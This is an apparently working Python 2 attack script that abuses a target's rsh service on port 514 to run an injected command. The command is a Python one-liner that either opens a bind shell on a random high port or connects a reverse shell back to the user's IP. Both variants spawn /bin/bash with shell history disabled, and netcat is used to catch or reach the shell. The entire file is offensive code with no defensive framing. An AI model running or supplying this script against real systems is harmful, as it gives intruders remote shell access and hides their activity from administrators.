#!/usr/bin/python2.7
#Rsh Bind Shell Module

import sys
import socket
import random
import time
import subprocess
import signal

def getNetworkIp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('www.google.com', 0))
    return s.getsockname()[0]

def handler(signum, frame):
    print '======================YOU SHOULDN\'T HAVE USED CTRL C======================'
signal.signal(signal.SIGINT, handler)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

if len(sys.argv) < 4:
    print "exiting"
    print "Example ./rsh.py 10.129.121.16 foobar foobar"
    sys.exit()
else:
    host = sys.argv[1]
    fromuser = sys.argv[2]
    username = sys.argv[3]
    command = ""

SEND="%s\0%s\0%s\0" % (fromuser, username, command)

startport = 600
endport = 900
myport =  random.randrange(startport, endport)

startbindport = 5000
endbindport = 6000
bindport =  random.randrange(startbindport, endbindport)

payloadtype = raw_input('1.)Reverse Shell \n2.)Bind Shell\nChoose Your Option: ')

if payloadtype ==str("2"):
    s.bind(('0.0.0.0', myport))
    s.connect((host,514))
    bind1 = 'python -c "import os,pty,socket;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)'
    bind2 = ';s.bind((\'0.0.0.0\', %s));s.listen(1);(rem, addr) = s.accept();'%(bindport)
    bind3 = 'os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);'
    bind4 = 'os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn(\'/bin/bash\');s.close()"'
    BINDSHELL = bind1 + bind2 + bind3 +bind4
    SEND="%s\0%s\0%s\0" % (fromuser, username, BINDSHELL)
    s.send("\0")
    s.send(SEND)
    time.sleep(0.5)
    test = s.recv(1024)
    s.close()
    print 'Using Netcat To Connect To %s On Port %s'% (host, str(bindport))
    print 'Type Exit Into The Shell To Shut Down The Bind Port'
    subprocess.call(['nc' , str(host), str(bindport)])
elif payloadtype ==str("1"):

    uselocalip = raw_input('Get Ip Automatically? y/n: ')
    if uselocalip.lower() =="y":
        localip = getNetworkIp()
    else:
        localip = raw_input('Type Your Ip For Reverse Connection: ')
    print "Ip Changed To %s"%(localip)
    reverse1 = 'python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
    reverse2 = 's.connect((\'%s\',%s));'%(localip, bindport)
    reverse3 = 'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);'
    reverse4 = 'os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn(\'/bin/bash\');s.close()"'
    REVERSESHELL = reverse1 + reverse2 + reverse3 +reverse4
    s.bind(('0.0.0.0', myport))
    s.connect((host,514))
    SEND="%s\0%s\0%s\0" % (fromuser, username, REVERSESHELL)
    s.send("\0")
    s.send(SEND)
    print 'Using Netcat To Listen To On Port %s'% (str(bindport))
    print 'Type Exit Into The Shell To Shut Down The Bind Port'
    subprocess.call(['nc' ,'-lp', str(bindport)])
    time.sleep(0.5)
    test = s.recv(1024)
    s.close()
else:
    s.close()
    sys.exit()
